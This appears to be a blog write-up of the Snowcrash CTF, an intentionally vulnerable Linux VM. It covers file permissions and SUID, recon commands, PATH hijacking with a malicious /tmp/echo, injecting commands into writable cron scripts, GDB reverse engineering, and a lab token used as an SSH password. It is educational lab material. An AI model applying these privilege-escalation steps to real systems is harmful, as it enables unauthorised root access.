---
title: Snowcrash - Introduction to Cybersecurity and Privilege Escalation
date: 2026-01-27 10:00:00 +0100
categories: [Cybersecurity, System Administration, Reverse Engineering]
tags: [CTF, Privilege Escalation, Linux, SUID, Reverse Engineering, Cron, Bash, Token]
render_with_liquid: false
---

# Introduction :

In Linux security models, privilege escalation occurs when an attacker exploits a bug, design flaw, or configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected. Snowcrash is the entry point into the system security track — it teaches you to think like an attacker: look at every file permission, every running process, and every script as a potential attack surface.

# Project goals :

Snowcrash is a 1337 project based on a Capture The Flag (CTF) format. The objective is to navigate an intentionally vulnerable ISO image, discovering tokens to progress through 15 levels, ultimately escalating privileges to root. Each level presents a unique vulnerability class — from weak file permissions and `$PATH` hijacking to reverse engineering compiled binaries, script injection, and hardcoded secrets.

# Linux Permissions Primer :

Understanding Linux file permissions is foundational to every level. Every file has three permission sets — **owner**, **group**, and **others** — each with three bits: **read (r/4)**, **write (w/2)**, and **execute (x/1)**.

    $ ls -la /usr/local/bin/level01
    -rwsr-x--- 1 flag01 level01 7.2K Jan 28 2026 level01

The `s` in the owner execute position means the **SUID** bit is set.

| Special bit | Octal | Effect on executable |
|---|---|---|
| SUID (4xxx) | 4000 | Executes as the file's **owner** |
| SGID (2xxx) | 2000 | Executes as the file's **group** |
| Sticky (1xxx) | 1000 | Only owner can delete files in dir |

# Walkthrough :

:one: Environment Setup and Reconnaissance :

Mount the provided ISO in VirtualBox. Connect via SSH using the level's credentials. Initial recon is the same on every level:

    $ ssh level00@192.168.56.101 -p 4242

    $ id && ls -la
    $ find / -user flagXX 2>/dev/null          # files owned by target user
    $ find / -perm -4000 2>/dev/null           # all SUID binaries on system
    $ ps aux                                   # running processes
    $ crontab -l; cat /etc/cron*/* 2>/dev/null # scheduled tasks
    $ env                                      # environment variables

:two: Analyzing SUID Binaries :

When a binary owned by `flagXX` has the SUID bit, exploiting it runs code as `flagXX`. First, gather static information:

    $ file /usr/local/bin/levelXX
    $ strings /usr/local/bin/levelXX       # hardcoded strings, paths, passwords
    $ ltrace /usr/local/bin/levelXX        # intercept library calls (strcmp leaks)
    $ strace /usr/local/bin/levelXX        # intercept syscalls (open/read/write)

`ltrace` is the most powerful first step: if the binary calls `strcmp(user_input, "real_pass")`, the password is immediately visible in the trace output.

:three: PATH Hijacking :

If an SUID binary calls a command using a **relative path** (e.g., `echo`) instead of an absolute path (`/bin/echo`), the shell searches `$PATH` to locate it. Prepend a directory you control:

    # Confirm relative command usage
    $ strings /usr/local/bin/levelXX | grep -v "^/"

    # Create a malicious replacement in /tmp
    $ echo "/bin/getflag" > /tmp/echo
    $ chmod +x /tmp/echo

    # Hijack PATH and trigger the binary
    $ export PATH=/tmp:$PATH
    $ /usr/local/bin/levelXX
    Check flag.Here is your token: <TOKEN>

:four: Cron Job Injection :

Cron jobs run scripts periodically as a specific user. If a cron job owned by `flagXX` executes a **world-writable** script, inject a payload:

    # Enumerate cron definitions
    $ ls -la /etc/cron.d/ /etc/cron.hourly/ /var/spool/cron/

    # If a cron script is writable:
    $ echo "/bin/getflag > /tmp/token" >> /path/to/writable_script.sh

    # Wait for execution
    $ watch -n 1 cat /tmp/token

:five: Reverse Engineering with GDB and objdump :

For compiled binaries, disassemble statically and debug dynamically:

    # Static disassembly
    $ objdump -d -M intel /usr/local/bin/levelXX | grep -A 20 "<main>"

    # Dynamic debugging
    $ gdb -q /usr/local/bin/levelXX
    (gdb) set disassembly-flavor intel
    (gdb) break main
    (gdb) run
    (gdb) disassemble
    (gdb) info registers
    (gdb) x/s $eax           # examine memory as a string

Common pattern: a `cmp` instruction comparing a computed value against a hardcoded constant. Note the constant, convert from hex, and supply it as input.

:six: Script and Interpreted Language Analysis :

Some levels use Lua, PHP, Python, or Bash scripts running under a privileged wrapper:

    # Read the script to find what it executes or sources
    $ cat /usr/local/bin/levelXX.py

    # If it reads from or executes a file you can write to:
    # Inject a call to getflag in the writable file

    # If a Perl/PHP script has an SUID wrapper binary:
    $ ls -la /usr/local/bin/levelXX
    -rwsr-x--- 1 flagXX levelXX ... levelXX   # wrapper
    $ cat /usr/local/bin/levelXX.pl           # inspect the script it launches

:seven: Retrieving and Using Tokens :

The goal of each exploit is to execute `getflag` in the context of `flagXX`. The token printed is the SSH password for the next level.

    # After gaining a shell as flagXX (e.g. via su or a spawned shell from exploit):
    $ getflag
    Check flag.Here is your token: Nf3OBZ0gxqVfLRQSMHv8gLwHo

    # Use it to log in to the next level:
    $ ssh flag01@192.168.56.101 -p 4242
    Password: Nf3OBZ0gxqVfLRQSMHv8gLwHo
    $ getflag

# Questions and answers

:question: What is a Set-User-ID (SUID) bit and how does the kernel handle it?

> When `execve()` loads an SUID executable, the kernel sets the process's **Effective User ID (EUID)** to the file owner's UID, while the **Real User ID (RUID)** remains the caller's UID. All permission checks (reading files, executing `getflag`) are gated on the EUID — so the process operates with the file owner's privileges regardless of who launched it.

:question: Why is using relative paths in SUID binaries dangerous?

> Relative command names (e.g., `echo`) are resolved by searching `$PATH`. Since `$PATH` is a user-controlled environment variable, an attacker can prepend a directory they own, place a malicious script with the same name in it, and cause the SUID process to execute their script with elevated privileges.

:question: What does `2>/dev/null` do in bash commands?

> File descriptor `2` is Standard Error (`stderr`). Redirecting it to `/dev/null` silences all error messages. During reconnaissance with `find / -perm -4000`, the system generates thousands of "Permission denied" errors for inaccessible directories. Suppressing them makes the real results readable.

:question: What is the difference between `ltrace` and `strace`?

> `strace` intercepts **kernel system calls** (e.g., `open()`, `read()`, `execve()`) at the userspace/kernel boundary. `ltrace` intercepts calls to **shared library functions** (e.g., `strcmp()`, `malloc()` from libc). For Snowcrash, `ltrace` is typically more useful because it reveals high-level function arguments, including hardcoded passwords passed to `strcmp`.

:question: What is the difference between RUID, EUID, and Saved SUID?

> Linux processes maintain three UIDs. The **Real UID (RUID)** identifies who launched the process. The **Effective UID (EUID)** is used for all permission checks; for SUID binaries it is set to the file owner's UID. The **Saved Set-UID (SSUID)** is a copy of the EUID saved at exec time, allowing a process to temporarily drop and regain elevated privileges via `seteuid()`.

:question: How do you identify a writable cron script?

> Examine `/etc/crontab`, `/etc/cron.d/`, `/etc/cron.hourly/`, and user crontabs with `crontab -l`. For each script a privileged cron job runs, check file permissions with `ls -la`. A script writable by your current user — or stored in a directory you can write to — can be modified to inject arbitrary commands that execute as the cron job's user at the next scheduled interval.

# Ressources :

* Linux File Permissions and Attributes : https://wiki.archlinux.org/title/File_permissions_and_attributes
* Linux Privilege Escalation Techniques : https://payatu.com/blog/linux-privilege-escalation/
* GDB Documentation : https://sourceware.org/gdb/documentation/
* GTFOBins (SUID binary abuse reference) : https://gtfobins.github.io/
* Linux Privilege Escalation — HackTricks : https://book.hacktricks.xyz/linux-hardening/privilege-escalation
* Cron Job Security Risks : https://www.cyberciti.biz/faq/linux-security-cron-jobs/
